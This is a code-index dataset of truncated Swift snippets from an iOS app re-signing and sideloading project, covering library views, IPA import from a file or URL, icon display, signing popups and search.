2293,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift","Function setSelected - sets selected","override func setSelected(_ selected: Bool, animated: Bool) {
super.setSelected(selected, animated: animated)

if animated {"
2294,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift","Function traitCollectionDidChange - implements traitcollectiondidchange functionality","override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {
super.traitCollectionDidChange(previousTraitCollection)

if traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {"
2295,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift","Function configure - implements configure functionality","func configure(with app: NSManagedObject, filePath: URL) {
var appName = """"
if let name = app.value(forKey: ""name"") as? String {"
2296,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift","Function getValue - retrieves value","func getValue<T>(forKey key: String, from app: NSManagedObject) -> T? {
guard let attributeType = app.entity.attributesByName[key]?.attributeType else {"
2297,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift","class BadgeView - UI component for display and interaction","class BadgeView: UIView {
private let badgeLabel = UILabel()

override init(frame: CGRect) {"
2298,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/AppsTableViewCell.swift","Function setupView - sets upview","private func setupView() {
badgeLabel.text = ""BETA""
badgeLabel.textColor = .label
badgeLabel.textAlignment = .center
badgeLabel.backgroundColor = .systemYellow.withAlphaComponent(0.2)
badgeLabel.font = .boldSystemFont(ofSize: 12)

badgeLabel.translatesAutoresizingMaskIntoConstraints = false
addSubview(badgeLabel)
"
2299,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift","/ Extension to fix icon display issues in LibraryViewController","extension LibraryViewController {
// MARK: - Icon Loading with LED Effects

/// Enhanced icon loading for app cells with LED effects
/// - Parameters:
///   - cell: The cell to configure
///   - app: The app object containing icon information
///   - filePath: The path to the app's files
func loadEnhancedIcon(for cell: AppsTableViewCell, with app: NSManagedObject, filePath: URL) {"
2300,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift","MARK: - Icon Loading with LED Effects / Enhanced icon loading for app cells with LED effects / - Parameters: /   - cell: The cell to configure /   - app: The app object containing icon information /   - filePath: The path to the app's files","func loadEnhancedIcon(for cell: AppsTableViewCell, with app: NSManagedObject, filePath: URL) {
// Start with a loading placeholder
if let defaultImage = UIImage(named: ""unknown"") {"
2301,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift","/ Try multiple methods to load the app icon / - Parameters: /   - cell: The cell to configure /   - imagePath: Path to the icon /   - app: The app object /   - filePath: Path to the app's files","private func tryLoadingIconWithFallbacks(cell: AppsTableViewCell,
imagePath: URL,
app: NSManagedObject,
filePath: URL)
{"
2302,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift","/ Extract icon information from the app's Info.plist / - Parameters: /   - cell: The cell to configure /   - app: The app object /   - appPath: Path to the app bundle","private func extractIconFromInfoPlist(cell: AppsTableViewCell, app: NSManagedObject, appPath: URL) {
// Find the app's Info.plist
let infoPlistPath = appPath.appendingPathComponent(""Info.plist"")

guard FileManager.default.fileExists(atPath: infoPlistPath.path),
let infoPlist = NSDictionary(contentsOf: infoPlistPath)
else {"
2303,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift","/ Set the image with an LED effect for better visibility / - Parameters: /   - cell: The cell to configure /   - image: The image to display /   - defaultEffect: Whether to apply special effect for default images","private func setImageWithLEDEffect(cell: AppsTableViewCell, image: UIImage, defaultEffect: Bool = false) {
// Remove any existing animations
cell.imageView?.layer.removeAllAnimations()

// Set the image
SectionIcons.sectionImage(to: cell, with: image)

// Apply appropriate LED effect
DispatchQueue.main.async {"
2304,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+IconFix.swift","MARK: - Import Label Enhancement / Add an import label indicator to show app source / - Parameters: /   - cell: The cell to configure /   - sourceLocation: The source location string","func addImportSourceLabel(to cell: AppsTableViewCell, sourceLocation: String?) {
// Remove any existing label first
if let existingLabel = cell.contentView.viewWithTag(9876) {"
2305,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","extension LibraryViewController - Controls user interface and application flow","extension LibraryViewController: UIDocumentPickerDelegate {
func startImporting() {"
2306,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function startImporting - implements startimporting functionality","func startImporting() {
let actionSheet = UIAlertController(title: nil, message: nil, preferredStyle: .actionSheet)

let documentPickerAction = UIAlertAction(
title: String.localized(""LIBRARY_VIEW_CONTROLLER_IMPORT_ACTION_SHEET_FILE""),
style: .default
) { [weak self] _ in"
2307,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function downloadFileFromUrl - implements downloadfilefromurl functionality","func downloadFileFromUrl() {
let alert = UIAlertController(
title: String.localized(""LIBRARY_VIEW_CONTROLLER_IMPORT_ACTION_SHEET_URL""),
message: nil,
preferredStyle: .alert
)

alert.addTextField { textField in"
2308,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function textURLDidChange - implements texturldidchange functionality","@objc func textURLDidChange(_ textField: UITextField) {
guard let alertController = presentedViewController as? UIAlertController,
let setAction = alertController.actions.first(where: { [weak self] action in"
2309,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function isValidURL - checks if validurl","func isValidURL(_ url: String) -> Bool {
let urlPredicate = NSPredicate(format: ""SELF MATCHES %@"", ""https://.+"")
return urlPredicate.evaluate(with: url)
}

//

func presentDocumentPicker(fileExtension: [UTType]) {"
2310,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function presentDocumentPicker - implements presentdocumentpicker functionality","func presentDocumentPicker(fileExtension: [UTType]) {
let documentPicker = UIDocumentPickerViewController(forOpeningContentTypes: fileExtension, asCopy: true)
documentPicker.delegate = self
documentPicker.allowsMultipleSelection = false
present(documentPicker, animated: true, completion: nil)
}

func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {"
2311,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function documentPicker - implements documentpicker functionality","func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
guard let selectedFileURL = urls.first else { return }"
2312,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function documentPickerWasCancelled - implements documentpickerwascancelled functionality","func documentPickerWasCancelled(_ controller: UIDocumentPickerViewController) {
controller.dismiss(animated: true, completion: nil)
}
}

extension LibraryViewController {"
2313,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","extension LibraryViewController - Controls user interface and application flow","extension LibraryViewController {
static var appDownload: AppDownload?
func startDownloadIfNeeded(downloadURL: URL?, sourceLocation: String) {"
2314,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function startDownloadIfNeeded - implements startdownloadifneeded functionality","func startDownloadIfNeeded(downloadURL: URL?, sourceLocation: String) {
guard let downloadURL = downloadURL else {"
2315,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","extension LibraryViewController - Controls user interface and application flow","extension LibraryViewController {
@objc func startInstallProcess(app: NSManagedObject, filePath: String) {"
2316,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function startInstallProcess - implements startinstallprocess functionality","@objc func startInstallProcess(app: NSManagedObject, filePath: String) {
guard !filePath.isEmpty else {"
2317,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function shareFile - implements sharefile functionality","@objc func shareFile(app: NSManagedObject, filePath: String) {
guard !filePath.isEmpty else {"
2318,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","MARK: - Legacy methods for backward compatibility","@objc func startInstallProcess(meow: NSManagedObject, filePath: String) {
startInstallProcess(app: meow, filePath: filePath)
}

@objc func shareFile(meow: NSManagedObject, filePath: String) {"
2319,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function shareFile - implements sharefile functionality","@objc func shareFile(meow: NSManagedObject, filePath: String) {
shareFile(app: meow, filePath: filePath)
}

func presentTransferPreview(
with appPath: String,
isSharing: Bool = false,
id: String,
version: String,
name: String"
2320,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Import.swift","Function presentTransferPreview - implements presenttransferpreview functionality","func presentTransferPreview(
with appPath: String,
isSharing: Bool = false,
id: String,
version: String,
name: String
) {"
2321,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift","Extension to fix file import location and structure issues","extension LibraryViewController {
/// Enhanced implementation of handleIPAFile to correctly store app files
/// - Parameters:
///   - destinationURL: The URL of the IPA file to process
///   - uuid: Unique identifier for the file
///   - dl: AppDownload instance to use for processing
/// - Throws: Any error encountered during file processing
func handleIPAFile(destinationURL: URL, uuid: String, dl: AppDownload) throws {"
2322,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift","/ Enhanced implementation of handleIPAFile to correctly store app files / - Parameters: /   - destinationURL: The URL of the IPA file to process /   - uuid: Unique identifier for the file /   - dl: AppDownload instance to use for processing / - Throws: Any error encountered during file processing","func handleIPAFile(destinationURL: URL, uuid: String, dl: AppDownload) throws {
// Create semaphore for synchronous processing
let semaphore = DispatchSemaphore(value: 0)
var functionError: Error?

// Log the operation
backdoor.Debug.shared.log(message: ""Processing IPA file: \(destinationURL.lastPathComponent)"", type: .info)

// Import and process the IPA file
DispatchQueue(label: ""AppImport"").async {"
2323,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift","/ Show an error alert for import failures / - Parameter message: The error message to display","private func showImportErrorAlert(message: String) {
let alert = UIAlertController(
title: ""Import Failed"",
message: message,
preferredStyle: .alert
)
alert.addAction(UIAlertAction(title: ""OK"", style: .default))
present(alert, animated: true)
}
"
2324,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift","/ Applies all import-related fixes","func applyImportFixes() {
// Hook into the document picker delegate method
// This is done at runtime using method swizzling
Self.swizzleMethods(
originalClass: LibraryViewController.self,
originalSelector: #selector(documentPicker(_:didPickDocumentsAt:)),
swizzledClass: LibraryViewController.self,
swizzledSelector: #selector(fixedDocumentPicker(_:didPickDocumentsAt:))
)
"
2325,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift","/ Fixed implementation of document picker delegate method","@objc func fixedDocumentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
guard let selectedFileURL = urls.first else { return }"
2326,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+ImportFix.swift","MARK: - Swizzling Helper / Helper method to swizzle methods at runtime","private static func swizzleMethods(
originalClass: AnyClass,
originalSelector: Selector,
swizzledClass: AnyClass,
swizzledSelector: Selector
) {"
2327,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+PopupFix.swift","Extension to fix popup presentation in LibraryViewController","extension LibraryViewController {
/// Configures popup detents for proper height based on content - implementation moved to main class

/// Fixed method to handle signing a downloaded app - ensures sign popup works correctly
/// - Parameter app: The app to sign
func startSigning(app: NSManagedObject) {"
2328,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+PopupFix.swift","/ Configures popup detents for proper height based on content - implementation moved to main class / Fixed method to handle signing a downloaded app - ensures sign popup works correctly / - Parameter app: The app to sign","func startSigning(app: NSManagedObject) {
// Ensure we have a valid DownloadedApps object
guard let downloadedApp = app as? DownloadedApps else {"
2329,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController+Types.swift","/ Source application version representation","struct SourceAppVersion {
let version: String
let downloadURL: URL

// Add any other properties that might be needed based on usage in the code

// Initializer from StoreAppsDataVersion (if this type exists in the codebase)
init(from storeVersion: Any) {"
2330,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","class LibraryViewController - Controls user interface and application flow","class LibraryViewController: UITableViewController {
// MARK: - Properties

var signedApps: [SignedApps]?
var downloadedApps: [DownloadedApps]?

var filteredSignedApps: [SignedApps] = []
var filteredDownloadedApps: [DownloadedApps] = []

var installer: Installer?"
2331,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
setupViews()
setupSearchController()
fetchSources()
loaderAlert = presentLoader()
}

override func viewWillAppear(_ animated: Bool) {"
2332,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)
setupNavigation()
}

deinit {"
2333,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","MARK: - Setup","private func setupViews() {
tableView.dataSource = self
tableView.delegate = self
tableView.register(AppsTableViewCell.self, forCellReuseIdentifier: ""RoundedBackgroundCell"")

NotificationCenter.default.addObserver(
self,
selector: #selector(refreshData),
name: Notification.Name(""lfetch""),
object: nil"
2334,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function handleInstallNotification - implements handleinstallnotification functionality","@objc private func handleInstallNotification(_ notification: Notification) {
guard let downloadedApp = notification.userInfo?[""downloadedApp""] as? DownloadedApps else {"
2335,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function setupNavigation - sets upnavigation","private func setupNavigation() {
navigationController?.navigationBar.prefersLargeTitles = true
title = String.localized(""TAB_LIBRARY"")
}

// MARK: - Data Management

@objc func refreshData() {"
2336,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","MARK: - Data Management","@objc func refreshData() {
fetchSources()
}

func fetchSources() {"
2337,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function fetchSources - implements fetchsources functionality","func fetchSources() {
signedApps = CoreDataManager.shared.getDatedSignedApps()
downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()

DispatchQueue.main.async {"
2338,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","MARK: - App Update Handling","private func handleAppUpdate(for signedApp: SignedApps) {
guard let sourceURL = signedApp.originalSourceURL else {"
2339,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function fetchDebugModeUpdate - implements fetchdebugmodeupdate functionality","private func fetchDebugModeUpdate(for signedApp: SignedApps) {
let mockSource = SourceRefreshOperation()
mockSource.createMockSource { [weak self] mockSourceData in"
2340,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function fetchProductionUpdate - implements fetchproductionupdate functionality","private func fetchProductionUpdate(from sourceURL: URL, for signedApp: SignedApps) {
SourceGET().downloadURL(from: sourceURL) { [weak self] result in"
2341,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function handleSourceData - implements handlesourcedata functionality","private func handleSourceData(_ sourceData: SourcesData, for signedApp: SignedApps) {
guard let bundleId = signedApp.bundleidentifier,
let updateVersion = signedApp.updateVersion,
let app = sourceData.apps.first(where: { $0.bundleIdentifier == bundleId }),"
2342,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function downloadAndProcessUpdate - implements downloadandprocessupdate functionality","private func downloadAndProcessUpdate(version: SourceAppVersion, originalApp: SignedApps) {
let uuid = UUID().uuidString

DispatchQueue.global(qos: .background).async { [weak self] in"
2343,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function prepareAndSignDownloadedUpdate - implements prepareandsigndownloadedupdate functionality","private func prepareAndSignDownloadedUpdate(uuid: String, originalApp: SignedApps) {
let downloadedApps = CoreDataManager.shared.getDatedDownloadedApps()
guard let downloadedApp = downloadedApps.first(where: { $0.uuid == uuid }) else {"
2344,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","MARK: - Helper Methods","func getApplicationFilePath(with _: NSManagedObject?,
row: Int,
section: Int,
getuuidonly: Bool = false) -> URL?
{"
2345,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function getApplication - retrieves application","func getApplication(row: Int, section: Int) -> NSManagedObject? {
switch section {"
2346,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","MARK: - UITableView DataSource & Delegate","extension LibraryViewController {
override func numberOfSections(in _: UITableView) -> Int {"
2347,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int {
return 2
}

override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
2348,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
switch section {"
2349,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {
switch section {"
2350,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = AppsTableViewCell(style: .subtitle, reuseIdentifier: ""RoundedBackgroundCell"")
cell.selectionStyle = .default
cell.accessoryType = .disclosureIndicator
cell.backgroundColor = .clear

guard let source = getApplication(row: indexPath.row, section: indexPath.section),
let filePath = getApplicationFilePath(
with: source,
row: indexPath.row,"
2351,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function configureCell - implements configurecell functionality","private func configureCell(_ cell: AppsTableViewCell, with app: NSManagedObject, filePath: URL) {
if let iconURL = app.value(forKey: ""iconURL"") as? String {"
2352,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
guard let app = getApplication(row: indexPath.row, section: indexPath.section),
let fullPath = getApplicationFilePath(
with: app,
row: indexPath.row,
section: indexPath.section,
getuuidonly: false
)
else {"
2353,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function handleSignedAppAction - implements handlesignedappaction functionality","private func handleSignedAppAction(
app: NSManagedObject,
uuidPath: URL?,
fullPath: URL,
appName: String,
indexPath: IndexPath
) {"
2354,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function configureUpdateMenuButtons - implements configureupdatemenubuttons functionality","private func configureUpdateMenuButtons(
for signedApp: SignedApps,
appName: String,
indexPath: IndexPath
) {"
2355,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function configureRegularMenuButtons - implements configureregularmenubuttons functionality","private func configureRegularMenuButtons(
for app: NSManagedObject,
uuidPath: URL?,
fullPath: URL,
appName: String,
indexPath: IndexPath
) {"
2356,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function handleResignApp - implements handleresignapp functionality","private func handleResignApp(app: NSManagedObject, fullPath: URL, indexPath: IndexPath) {
guard let signedApp = app as? SignedApps else { return }"
2357,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function showNoCertificatesAlert - implements shownocertificatesalert functionality","private func showNoCertificatesAlert() {
let alert = UIAlertController(
title: String.localized(""APP_SIGNING_VIEW_CONTROLLER_NO_CERTS_ALERT_TITLE""),
message: String.localized(""APP_SIGNING_VIEW_CONTROLLER_NO_CERTS_ALERT_DESCRIPTION""),
preferredStyle: .alert
)
alert.addAction(UIAlertAction(title: String.localized(""LAME""), style: .default))
present(alert, animated: true)
}
"
2358,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function handleDownloadedAppAction - implements handledownloadedappaction functionality","private func handleDownloadedAppAction(
app: NSManagedObject,
uuidPath: URL?,
appName: String
) {"
2359,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function showInstallConfirmationAlert - implements showinstallconfirmationalert functionality","private func showInstallConfirmationAlert(app: NSManagedObject, filePath: String) {
let alertController = UIAlertController(
title: String.localized(""LIBRARY_VIEW_CONTROLLER_SIGN_ACTION_INSTALL_CONFIRM""),
message: String.localized(""LIBRARY_VIEW_CONTROLLER_SIGN_ACTION_INSTALL_CONFIRM_DESCRIPTION""),
preferredStyle: .alert
)

let confirmAction = UIAlertAction(
title: String.localized(""INSTALL""),
style: .default"
2360,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function configurePopupDetents - implements configurepopupdetents functionality","private func configurePopupDetents(hasUpdate: Bool) {
let detentHeight = hasUpdate ? 150.0 : 270.0
let detent: UISheetPresentationController.Detent = ._detent(
withIdentifier: ""PopupDetent"",
constant: detentHeight
)

if let presentationController = popupVC.presentationController as? UISheetPresentationController {"
2361,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function startSigning - implements startsigning functionality","func startSigning(meow: NSManagedObject) {
// Call the new method with the renamed parameter to avoid recursion
startSigning(app: meow)
}

override func tableView(
_: UITableView,
trailingSwipeActionsConfigurationForRowAt indexPath: IndexPath
) -> UISwipeActionsConfiguration? {"
2362,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function tableView - implements tableview functionality","override func tableView(
_: UITableView,
trailingSwipeActionsConfigurationForRowAt indexPath: IndexPath
) -> UISwipeActionsConfiguration? {"
2363,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function tableView - implements tableview functionality","override func tableView(
_: UITableView,
contextMenuConfigurationForRowAt indexPath: IndexPath,
point _: CGPoint
) -> UIContextMenuConfiguration? {"
2364,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","MARK: - Fetch Data Extension","extension LibraryViewController {
@objc func afetch() { fetchSources() }"
2365,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function afetch - implements afetch functionality","@objc func afetch() { fetchSources() }
}

extension LibraryViewController: UISearchResultsUpdating {"
2366,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","extension LibraryViewController - Controls user interface and application flow","extension LibraryViewController: UISearchResultsUpdating {
func updateSearchResults(for searchController: UISearchController) {"
2367,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function updateSearchResults - updates searchresults","func updateSearchResults(for searchController: UISearchController) {
let searchText = searchController.searchBar.text ?? """"
filterContentForSearchText(searchText)
tableView.reloadData()
}

private func filterContentForSearchText(_ searchText: String) {"
2368,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function filterContentForSearchText - implements filtercontentforsearchtext functionality","private func filterContentForSearchText(_ searchText: String) {
let lowercasedSearchText = searchText.lowercased()

filteredSignedApps = signedApps?.filter { app in"
2369,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","extension LibraryViewController - Controls user interface and application flow","extension LibraryViewController: UISearchControllerDelegate, UISearchBarDelegate {
func setupSearchController() {"
2370,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Function setupSearchController - sets upsearchcontroller","func setupSearchController() {
searchController = UISearchController(searchResultsController: nil)
searchController.obscuresBackgroundDuringPresentation = false
searchController.hidesNavigationBarDuringPresentation = true
searchController.searchResultsUpdater = self
searchController.delegate = self
searchController.searchBar.placeholder = String.localized(""SETTINGS_VIEW_CONTROLLER_SEARCH_PLACEHOLDER"")
navigationItem.searchController = searchController
definesPresentationContext = true
navigationItem.hidesSearchBarWhenScrolling = false"
2371,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","Extension to provide loading alert functionality","extension LibraryViewController {
/// https://stackoverflow.com/a/75310581
func presentLoader() -> UIAlertController {"
2372,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/LibraryViewController.swift","/ https://stackoverflow.com/a/75310581","func presentLoader() -> UIAlertController {
let alert = UIAlertController(title: nil, message: """", preferredStyle: .alert)
let activityIndicator = UIActivityIndicatorView(style: .large)
activityIndicator.translatesAutoresizingMaskIntoConstraints = false
activityIndicator.isUserInteractionEnabled = false
activityIndicator.startAnimating()

alert.view.addSubview(activityIndicator)

NSLayoutConstraint.activate(["
2373,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","class AppsInformationViewController - Controls user interface and application flow","class AppsInformationViewController: UIViewController {
var tableView: UITableView!

var tableData = [
[
String.localized(""APPS_INFORMATION_TITLE_NAME""),
String.localized(""APPS_INFORMATION_TITLE_VERSION""),
String.localized(""APPS_INFORMATION_TITLE_IDENTIFIER""),
// String.localized(""APPS_INFORMATION_TITLE_SIZE"")
],"
2374,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
setupViews()
setupNavigation()
}

private func setupViews() {"
2375,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function setupViews - sets upviews","private func setupViews() {
tableView = UITableView(frame: .zero, style: .insetGrouped)
tableView.translatesAutoresizingMaskIntoConstraints = false
tableView.dataSource = self
tableView.delegate = self
tableView.tableHeaderView = configureHeaderView()

if !FileManager.default.fileExists(atPath: filePath.path) {"
2376,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function configureHeaderView - implements configureheaderview functionality","private func configureHeaderView() -> UIView {
let headerView = UIView(frame: CGRect(x: 0, y: 0, width: view.frame.width, height: 100))
headerView.backgroundColor = .clear

if let iconURL = source.value(forKey: ""iconURL"") as? String {"
2377,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function setupNavigation - sets upnavigation","private func setupNavigation() {
title = nil
navigationItem.rightBarButtonItem = UIBarButtonItem(
barButtonSystemItem: .close,
target: self,
action: #selector(closeSheet)
)
}

@objc func closeSheet() {"
2378,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function closeSheet - implements closesheet functionality","@objc func closeSheet() {
dismiss(animated: true, completion: nil)
}

func scrollViewDidScroll(_ scrollView: UIScrollView) {"
2379,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Apps/Information/AppsInformationViewController.swift","Function scrollViewDidScroll - implements scrollviewdidscroll functionality","func scrollViewDidScroll(_ scrollView: UIScrollView) {
let threshold: CGFloat = 40

if scrollView.contentOffset.y > threshold {"
